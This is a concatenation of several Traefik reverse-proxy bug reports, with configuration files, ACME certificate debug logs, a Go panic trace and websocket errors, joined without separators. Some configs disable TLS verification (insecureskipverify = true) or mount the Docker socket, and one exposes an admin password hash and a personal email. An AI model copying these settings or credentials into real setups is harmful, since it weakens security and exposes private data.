time="2018-01-25t10:06:07z" level=debug msg="loadcertificatefordomains [exceptions.sandbox.domain.com]..." time="2018-01-25t10:06:07z" level=debug msg="looking for provided certificate to validate [exceptions.sandbox.domain.com]..." time="2018-01-25t10:06:07z" level=debug msg="no provided certificate found for domains [exceptions.sandbox.domain.com], get acme certificate." time="2018-01-25t10:06:07z" level=debug msg="loading acme certificates [exceptions.sandbox.domain.com]..." legolog: 2018/01/25 10:06:07 [info][exceptions.sandbox.domain.com] authurl:
legolog: 2018/01/25 10:06:07 [info][exceptions.sandbox.domain.com] acme: could not find solver for: dns-01
legolog: 2018/01/25 10:06:07 [info][exceptions.sandbox.domain.com] acme: trying to solve http-01
time="2018-01-25t10:06:07z" level=debug msg="challenge present exceptions.sandbox.domain.com" time="2018-01-25t10:06:09z" level=debug msg="filtering container without port and no traefik.port label traefik.1 : strconv.atoi: parsing "": invalid syntax" time="2018-01-25t10:06:09z" level=debug msg="filtering container without port and no traefik.port label payment_php.1 : strconv.atoi: parsing "": invalid syntax" time="2018-01-25t10:06:09z" level=debug msg="filtering container without port and no traefik.port label my_php.1 : strconv.atoi: parsing "": invalid syntax" time="2018-01-25t10:06:09z" level=debug msg="filtering container without port and no traefik.port label webfrontend_php.1 : strconv.atoi: parsing "": invalid syntax" time="2018-01-25t10:06:09z" level=debug msg="filtering container without port and no traefik.port label rest-api_php.1 : strconv.atoi: parsing "": invalid syntax" time="2018-01-25t10:06:09z" level=debug msg="filtering container without port and no traefik.port label order_php.1 : strconv.atoi: parsing "": invalid syntax" time="2018-01-25t10:06:09z" level=debug msg="filtering container without port and no traefik.port label catalog_php.1 : strconv.atoi: parsing "": invalid syntax" time="2018-01-25t10:06:09z" level=debug msg="filtering container without port and no traefik.port label price_php.1 : strconv.atoi: parsing "": invalid syntax" time="2018-01-25t10:06:09z" level=debug msg="filtering container without port and no traefik.port label notifications_php.1 : strconv.atoi: parsing "": invalid syntax" time="2018-01-25t10:06:09z" level=debug msg="filtering container without port and no traefik.port label exceptions_php.1 : strconv.atoi: parsing "": invalid syntax" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.entrypoints labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.auth.basic labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.auth.basic labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.entrypoints labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.auth.basic labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.entrypoints labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.auth.basic labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.entrypoints labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.auth.basic labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.entrypoints labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.auth.basic labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.entrypoints labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.auth.basic labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.entrypoints labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.auth.basic labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.entrypoints labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.auth.basic labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.entrypoints labels" time="2018-01-25t10:06:09z" level=debug msg="could not load traefik.frontend.auth.basic labels" ``` </details>
toml : ```toml
debug = true defaultentrypoints = ["http", "https"] [web]
address = ":8080" [web.auth.basic] users = ["admin:$apr1$/cmhxqrz$nrmd8lhx1dfpgcrjjpxva/"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoints = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls]
# [[entrypoints.https.tls.certificates]]
# certfile = "/certs/live/demo1.idemacloud.com/fullchain.pem"
# keyfile = "/certs/live/demo1.idemacloud.com/privkey.pem" [docker]
endpoint= "unix:///var/run/docker.sock"
domain = "idemacloud.com"
watch = true [acme]
email = "damiens.robert@gmail.com"
storage = "acme.json"
entrypoint = "https"
onhostrule = true
dnsprovider = "ovh"
``` docker-compose.yml :
```yml version: \'2\' volumes: database_data02b: driver: local services: php: container_name: dockerapache_php_preprod restart: always image: damiens/httpd:version1 expose: - "80" volumes: - "./www:/usr/local/apache2/www" - "./conf.d/vhost.conf:/usr/local/apache2/conf/extra/httpd-vhosts.conf" networks: - traefik_proxy_network - internal labels: - traefik.backend=preprod - traefik.frontend.rule=host:demo2.idemacloud.com,demo3.idemacloud.com - traefik.port=80 - traefik.docker.network=traefik_proxy_network - traefik.domain = idemacloud.com
networks: traefik_proxy_network: external: true internal: external: false
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```shell time="2018-01-22t20:09:27z" level=debug msg="loadcertificatefordomains [demo1.idemacloud.com]..." time="2018-01-22t20:09:27z" level=debug msg="looking for provided certificate to validate [demo1.idemacloud.com]..." time="2018-01-22t20:09:27z" level=debug msg="no provided certificate found for domains [demo1.idemacloud.com], get acme certificate." time="2018-01-22t20:09:27z" level=debug msg="loading acme certificates [demo1.idemacloud.com]..." time="2018-01-22t20:09:27z" level=error msg="error in go routine: runtime error: invalid memory address or nil pointer dereference" goroutine 26 [running]: runtime/debug.stack( , , ) /usr/local/go/src/runtime/debug/stack.go:24 + runtime/debug.printstack() /usr/local/go/src/runtime/debug/stack.go:16 + github.com/containous/traefik/safe.defaultrecovergoroutine( , ) /go/src/github.com/containous/traefik/safe/routine.go:148 + github.com/containous/traefik/safe.gowithrecover.func1.1( ) /go/src/github.com/containous/traefik/safe/routine.go:139 + panic( , ) /usr/local/go/src/runtime/panic.go:491 + github.com/containous/traefik/vendor/github.com/ovh/go-ovh/ovh.(*client).callapi( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/ovh/go-ovh/ovh/ovh.go:283 + github.com/containous/traefik/vendor/github.com/ovh/go-ovh/ovh.(*client).post( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/ovh/go-ovh/ovh/ovh.go:145 + github.com/containous/traefik/vendor/github.com/xenolf/lego/providers/dns/ovh.(*dnsprovider).present( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/providers/dns/ovh/ovh.go:97 + github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*dnschallenge).solve( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/dns_challenge.go:88 + github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).solvechallenges( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:502 + github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:387 + github.com/containous/traefik/acme.(*acme).getdomainscertificates( , , , , , , ) /go/src/github.com/containous/traefik/acme/acme.go:705 + github.com/containous/traefik/acme.(*acme).loadcertificatefordomains.func1() /go/src/github.com/containous/traefik/acme/acme.go:644 + github.com/containous/traefik/acme.(*acme).runjobs.func1() /go/src/github.com/containous/traefik/acme/acme.go:724 + github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 + created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 +
[[acme.domains]] main = "sub.domain.com" [backends] [backends.hass] [backends.hass.servers.server1] url = " "
[frontends] [frontends.hass] backend = "hass" passhostheader = true priority = 5 entrypoints = ["https"] [frontends.hass.routes.1] rule = "host:sub.domain.com"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) connection log using `traefik:v1.5.0-rc4` which works fine:
info[2018-01-16t22:07:54z] vulcand/oxy/forward/http: round trip: code: 200, length: 348968, duration: 332.333635ms tls:version: 303, tls:resume:false, tls:csuite:cca8, tls:server:sub.domain.com
connection log using `traefik:v1.5.0-rc5`:
erro[2018-01-16t22:14:25z] vulcand/oxy/forward/websocket: error dialing "sub.domain.com": websocket: invalid compression negotiation with resp: 101 101 switching protocols erro[2018-01-16t22:14:25z] vulcand/oxy/forward/websocket: failed to forward response
``` and in debug mode:
debu[2018-01-16t22:20:27z] looking for provided certificate to validate [sub.domain.com]..
debu[2018-01-16t22:20:27z] no provided certificate found for domains [sub.domain.com], get acme certificate
debu[2018-01-16t22:20:27z] looking for an existing acme challenge for sub.domain.com..
debu[2018-01-16t22:20:27z] acme got domain cert sub.domain.com debu[2018-01-16t22:20:27z] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/api/websocket","rawpath":"","forcequery":false,"rawquery":"latest","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"connection":["keep-alive, upgrade"],"cookie":["_ga=ga1.2.1226370215.1433509916; __zlcmid=boffdx8t4qbotq"],"dnt":["1"],"origin":[" "],"pragma":["no-cache"],"sec-websocket-extensions":["permessage-deflate"],"sec-websocket-key":["lu1h++9k7ic8vwtjhq40gw=="],"sec-websocket-version":["13"],"upgrade":["websocket"],"user-agent":["mozilla/5.0 (x11; linux x86_64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"sub.domain.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"10.101.0.173:42766","requesturi":"/api/websocket?latest","tls":null}"
debu[2018-01-16t22:20:27z] vulcand/oxy/roundrobin/rr: forwarding this request to url forwardurl= request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/api/websocket","rawpath":"","forcequery":false,"rawquery":"latest","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"connection":["keep-alive, upgrade"],"cookie":["_ga=ga1.2.1226370215.1433509916; __zlcmid=boffdx8t4qbotq"],"dnt":["1"],"origin":[" "],"pragma":["no-cache"],"sec-websocket-extensions":["permessage-deflate"],"sec-websocket-key":["lu1h++9k7ic8vwtjhq40gw=="],"sec-websocket-version":["13"],"upgrade":["websocket"],"user-agent":["mozilla/5.0 (x11; linux x86_64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"sub.domain.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"10.101.0.173:42766","requesturi":"/api/websocket?latest","tls":null}"
debu[2018-01-16t22:20:27z] vulcand/oxy/forward: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.101.0.45:8123","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"connection":["keep-alive, upgrade"],"cookie":["_ga=ga1.2.1226370215.1433509916; __zlcmid=boffdx8t4qbotq"],"dnt":["1"],"origin":[" "],"pragma":["no-cache"],"sec-websocket-extensions":["permessage-deflate"],"sec-websocket-key":["lu1h++9k7ic8vwtjhq40gw=="],"sec-websocket-version":["13"],"upgrade":["websocket"],"user-agent":["mozilla/5.0 (x11; linux x86_64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"sub.domain.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"10.101.0.173:42766","requesturi":"/api/websocket?latest","tls":null}"
debu[2018-01-16t22:20:27z] vulcand/oxy/forward/websocket: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.101.0.45:8123","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"connection":["keep-alive, upgrade"],"cookie":["_ga=ga1.2.1226370215.1433509916; __zlcmid=boffdx8t4qbotq"],"dnt":["1"],"origin":[" "],"pragma":["no-cache"],"sec-websocket-extensions":["permessage-deflate"],"sec-websocket-key":["lu1h++9k7ic8vwtjhq40gw=="],"sec-websocket-version":["13"],"upgrade":["websocket"],"user-agent":["mozilla/5.0 (x11; linux x86_64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"sub.domain.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"10.101.0.173:42766","requesturi":"/api/websocket?latest","tls":null}"
erro[2018-01-16t22:20:28z] vulcand/oxy/forward/websocket: error dialing "sub.domain.com": websocket: invalid compression negotiation with resp: 101 101 switching protocols erro[2018-01-16t22:20:28z] vulcand/oxy/forward/websocket: failed to forward response debu[2018-01-16t22:20:28z] http: response.writeheader on hijacked connection debu[2018-01-16t22:20:28z] http: response.write on hijacked connection debu[2018-01-16t22:20:28z] vulcand/oxy/forward/websocket: competed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.101.0.45:8123","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"connection":["keep-alive, upgrade"],"cookie":["_ga=ga1.2.1226370215.1433509916; __zlcmid=boffdx8t4qbotq"],"dnt":["1"],"origin":[" "],"pragma":["no-cache"],"sec-websocket-extensions":["permessage-deflate"],"sec-websocket-key":["lu1h++9k7ic8vwtjhq40gw=="],"sec-websocket-version":["13"],"upgrade":["websocket"],"user-agent":["mozilla/5.0 (x11; linux x86_64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"sub.domain.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"10.101.0.173:42766","requesturi":"/api/websocket?latest","tls":null}"
debu[2018-01-16t22:20:28z] vulcand/oxy/forward: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.101.0.45:8123","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"connection":["keep-alive, upgrade"],"cookie":["_ga=ga1.2.1226370215.1433509916; __zlcmid=boffdx8t4qbotq"],"dnt":["1"],"origin":[" "],"pragma":["no-cache"],"sec-websocket-extensions":["permessage-deflate"],"sec-websocket-key":["lu1h++9k7ic8vwtjhq40gw=="],"sec-websocket-version":["13"],"upgrade":["websocket"],"user-agent":["mozilla/5.0 (x11; linux x86_64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"sub.domain.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"10.101.0.173:42766","requesturi":"/api/websocket?latest","tls":null}"
debu[2018-01-16t22:20:28z] vulcand/oxy/roundrobin/rr: competed servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/api/websocket","rawpath":"","forcequery":false,"rawquery":"latest","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"connection":["keep-alive, upgrade"],"cookie":["_ga=ga1.2.1226370215.1433509916; __zlcmid=boffdx8t4qbotq"],"dnt":["1"],"origin":[" "],"pragma":["no-cache"],"sec-websocket-extensions":["permessage-deflate"],"sec-websocket-key":["lu1h++9k7ic8vwtjhq40gw=="],"sec-websocket-version":["13"],"upgrade":["websocket"],"user-agent":["mozilla/5.0 (x11; linux x86_64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"sub.domain.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"10.101.0.173:42766","requesturi":"/api/websocket?latest","tls":null}"
################################################################
# global configuration
################################################################ insecureskipverify = true
defaultentrypoints = ["http","https"]
email = "test@traefik.io"
storage = "traefik/acme/account"
entrypoint = "https" [accesslog] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/traefik.crt" keyfile = "/etc/ssl/traefik.key" [retry]
attempts = -1 [forwardingtimeouts] # dialtimeout is the amount of time to wait until a connection to a backend server can be established.
# default: "30s"
dialtimeout = "3s" ################################################################
# web configuration backend
################################################################ [web]
address = ":9090" ################################################################
# file configuration backend
################################################################
trace = true ################################################################
# mesos/marathon configuration backend
################################################################ [marathon]
endpoint = " "
watch = true
domain = "marathon.localhost"
exposedbydefault = true
marathonlbcompatibility = true [marathon.dcoscredentials]
uid = "svc-traefik"
privatekey = "/etc/ssl/service-account.key"
loginendpoint = " " [marathon.tls]
insecureskipverify = true
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2018-01-15t18:51:11z" level=error msg="failed to render marathon configuration template: near line 66 (last key parsed \'backends\'): key \'backends.foo\' has already been defined." ```
services: traefik: image: ${image}:${release} environment: acme_email: ${acme_email} acme_default_host: ${acme_default_host} command: - --configfile=/run/secrets/traefik_admin - --loglevel=warn - --checknewversion=false - --insecureskipverify=true - --defaultentrypoints=http,https - "--entrypoints=name:http address::80 compress:true redirect.entrypoint:https" - "--entrypoints=name:https address::443 tls compress:true" - --acme - --acme.email=${acme_email} - --acme.domains=${acme_default_host} - --acme.onhostrule - --acme.entrypoint=https - --acme.storage=/data/acme.json - --docker - --docker.watch - --docker.exposedbydefault=false - --docker.swarmmode # - --debug networks: - traefik ports: - target: 80 published: 80 protocol: tcp mode: host - target: 443 published: 443 protocol: tcp mode: host volumes: - /var/run/docker.sock:/var/run/docker.sock:ro - traefik:/data healthcheck: test: ["cmd-shell", "traefik healthcheck --web"] interval: 30s timeout: 5s retries: 2 start_period: 30s deploy: restart_policy: condition: any delay: 2s update_config: monitor: 120s failure_action: continue labels: - "traefik.enable=true" - "traefik.docker.network=org_traefik" - "traefik.port=8080" - "traefik.protocol=http" - "traefik.frontend.rule=host:${acme_default_host};pathprefixstrip:/traefik" secrets: - traefik_admin
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
```toml ```
### if applicable, please paste the log output in debug mode (`--debug` switch) ```shell
time="2018-01-07t05:11:19z" level=debug msg="building acme client..." time="2018-01-07t05:11:19z" level=error msg="error building acme client &{email: registration:<nil> privatekey:[] domainscertificate:{certs:[] lock:{w:{state:0 sema:0} writersem:0 readersem:0 readercount:0 readerwait:0}} challengecerts:map[]}: private key was nil"
traefik with etcd backend in kubernetes
```toml ```
### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
`traefik.toml`:
defaultentrypoints = ["http", "https"] [accesslog]
filepath = "/etc/traefik/logs/access.log" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [docker]
swarmmode = true
domain = "traefik"
watch = true [web]
address = ":8080" [acme]
email = "redacted@redacted.com"
storage = "/etc/traefik/acme.json"
entrypoint = "https"
acmelogging = true
onhostrule = true ``` `traefik-stack.yml`:
version: "3" networks: app1-proxy: external: true app2-proxy: external: true services: proxy: image: traefik:1.4 networks: - app1-proxy - app2-proxy ports: - "80:80" - "443:443" - "8080:8080" volumes: - /var/run/docker.sock:/var/run/docker.sock - ./traefik:/etc/traefik
``` "appa1 and "app2" have their own stack, with the appropriate traefik labels on the web services.
consul catalog on google cloud <details>
<summary>traefik.toml</summary> ```toml
################################################################
# global configuration
################################################################ # enable debug mode
# default: false
# debug = true # log level
# default: "error"
# loglevel = "error" # entrypoints to be used by frontends that do not specify any entrypoint.
# each frontend can specify its own entrypoints.
# default: ["http"]
defaultentrypoints = ["http", "https"] # entrypoints definition
[entrypoints] [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] entrypoint = "https" # letsencrypt configuration
[acme] email = "acmesetup@domain.com"
storage = "traefik/acme/account"
entrypoint = "https"
onhostrule = true
ondemand = false
# comment the following line to go to prod
caserver = " " [[acme.domains]] main = "domain.com" # traefik logs
# enabled by default and log to stdout
# [traefiklog] # sets the filepath for the traefik log
if not specified, stdout will be used.
# intermediate directories are created if necessary.
# default: os.stdout
# filepath = "log/traefik.log" # format is either "json" or "common".
# default: "common"
# format = "common" # enable access logs
# by default it will write to stdout and produce logs in the textual
# common log format (clf), extended with additional fields.
# [accesslog] # sets the file path for the access log
if not specified, stdout will be used.
# intermediate directories are created if necessary.
# default: os.stdout
# filepath = "/path/to/log/log.txt" # format is either "json" or "common".
# default: "common"
# format = "common" ################################################################
# web configuration backend
################################################################ # enable web configuration backend
[web] # web administration port
address = ":8080" ################################################################
# docker configuration backend
################################################################ # enable docker configuration backend
# [docker] # docker server endpoint
can be a tcp or a unix socket endpoint.
# default: "unix:///var/run/docker.sock"
# endpoint = "tcp://10.10.10.10:2375" # default domain used.
# can be overridden by setting the "traefik.domain" label on a container.
# default: ""
# domain = "docker.localhost" # expose containers by default in traefik
# default: true
# exposedbydefault = true ################################################################
# consul kv configuration backend
################################################################ # enable consul kv configuration backend.
[consul] # consul server endpoint.
# default: "127.0.0.1:8500"
endpoint = "127.0.0.1:8500" # enable watch consul changes.
# default: true
watch = true # prefix used for kv store.
# default: traefik
prefix = "traefik" # override default configuration template.
# for advanced users :)
# filename = "consul.tmpl" # use consul user/pass authentication.
# username = foo
# password = bar # enable consul tls connection.
# [consul.tls]
# ca = "/etc/ssl/ca.crt"
# cert = "/etc/ssl/consul.crt"
# key = "/etc/ssl/consul.key"
# insecureskipverify = true ################################################################
# consul catalog configuration backend
################################################################ # enable consul catalog configuration backend.
[consulcatalog]
constraints = ["tag==loadbalanced"] # default domain used.
domain = "domain.com" # consul server endpoint.
# default: "127.0.0.1:8500"
endpoint = "127.0.0.1:8500" # expose consul catalog services by default in traefik.
# default: true
exposedbydefault = true # prefix for consul catalog tags.
# default: "traefik"
prefix = "traefik" # default frontend rule for consul services.
# the format is a go template with:
# - ".servicename", ".domain" and ".attributes" available
# - "gettag(name, tags, defaultvalue)", "hastag(name, tags)" and "getattribute(name, tags, defaultvalue)" functions are available
# - "getattribute(...)" function uses prefixed tag names based on "prefix" value
# default: "host:{{.servicename}}.{{.domain}}"
# frontendrule = "host:{{gettag \\"traefik.subdomain\\" .attributes .servicename }}.{{.domain}}"
``` </details> ### other notes see stackoverflow post here: #48066101 `onhostrule` does seem to work if i use the frontendrule config option: ```toml
frontendrule = "host:{{gettag \\"traefik.subdomain\\" .attributes .servicename }}.{{.domain}}"
<summary>config json</summary> ```json
{ "lifecycle": null, "gracetimeout": 50000000000, "debug": true, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": { "file": "/var/log/traefik/access.log", "format": "common" }, "traefiklogsfile": "/var/log/traefik/traefik.log", "traefiklog": null, "loglevel": "warn", "entrypoints": { "http": { "network": "", "address": ":80", "tls": null, "redirect": { "entrypoint": "https" }, "auth": null, "whitelistsourcerange": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "https": { "network": "", "address": ":443", "tls": { "minversion": "versiontls12", "ciphersuites": [ "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_ecdsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_aes_128_gcm_sha256", "tls_ecdhe_ecdsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_ecdsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_aes_128_cbc_sha", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha", "tls_ecdhe_rsa_with_aes_256_cbc_sha", "tls_ecdhe_ecdsa_with_aes_256_cbc_sha", "tls_rsa_with_aes_128_gcm_sha256", "tls_rsa_with_aes_256_gcm_sha384", "tls_rsa_with_aes_128_cbc_sha", "tls_rsa_with_aes_256_cbc_sha" ], "certificates": null, "clientcafiles": null, "clientca": { "files": null, "optional": false } }, "redirect": null, "auth": null, "whitelistsourcerange": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "traefik": { "network": "", "address": ":8080", "tls": null, "redirect": null, "auth": { "basic": { "users": [ "traefik-dashboard:redacted" ], "usersfile": "" }, "digest": null, "forward": null, "headerfield": "" }, "whitelistsourcerange": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": { "email": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "domains": null, "storage": "/etc/traefik/acme/acme.json", "storagefile": "", "ondemand": false, "onhostrule": true, "caserver": "", "entrypoint": "https", "dnsprovider": "", "delaydontcheckdns": 0, "acmelogging": true, "tlsconfig": null }, "defaultentrypoints": [ "http", "https" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": true, "rootcas": null, "retry": { "attempts": 0 }, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": { "readtimeout": 0, "writetimeout": 0, "idletimeout": 180000000000 }, "forwardingtimeouts": { "dialtimeout": 30000000000, "responseheadertimeout": 0 }, "web": null, "docker": { "watch": true, "filename": "", "constraints": null, "trace": false, "debugloggeneratedtemplate": false, "endpoint": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "domain": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "tls": null, "exposedbydefault": false, "usebindportip": false, "swarmmode": true }, "file": { "watch": true, "filename": "", "constraints": null, "trace": false, "debugloggeneratedtemplate": false, "directory": "/config/" }, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": { "entrypoint": "traefik", "dashboard": true, "debug": false, "currentconfigurations": null, "statistics": { "recenterrors": 40 }, "stats": null, "statsrecorder": null }, "metrics": null, "ping": null, "configfile": "//traefik.toml"
``` </details> <details>
<summary>log output of docker service discovery</summary> ```
time="2017-12-31t10:15:08z" level=debug msg="configuration received from provider docker: {"backends":{"backend-myapp-staging-myapp-staging-api":{"servers":{"server-myapp-staging_myapp-staging-api-2":{"url":" ","weight":0}},"loadbalancer":{"method":"drr"}},"backend-myapp-staging-myapp-staging-frontend":{"servers":{"server-myapp-staging_myapp-staging-frontend-1":{"url":" ","weight":0},"server-myapp-staging_myapp-staging-frontend-2":{"url":" ","weight":0},"server-myapp-staging_myapp-staging-frontend-3":{"url":" ","weight":0},"server-myapp-staging_myapp-staging-frontend-7":{"url":" ","weight":0}},"loadbalancer":{"method":"drr","stickiness":{}}}},"frontends":{"frontend-host-api-staging-myapp-example-com-0":{"entrypoints":["http","https"],"backend":"backend-myapp-staging-myapp-staging-api","routes":{"route-frontend-host-api-staging-myapp-example-com-0":{"rule":"host:api.redacted.example.com"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{}},"frontend-host-frontend-staging-myapp-example-com-1":{"entrypoints":["http","https"],"backend":"backend-myapp-staging-myapp-staging-frontend","routes":{"route-frontend-host-frontend-staging-myapp-example-com-1":{"rule":"host:frontend.redacted.example.com"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{}}}}"
``` </details> ### if applicable, please paste the log output in debug mode (`--debug` switch) <details>
<summary>log output during a single browser page request
/ failed to load all the way, thus not even initiating all resource requests</summary> ```
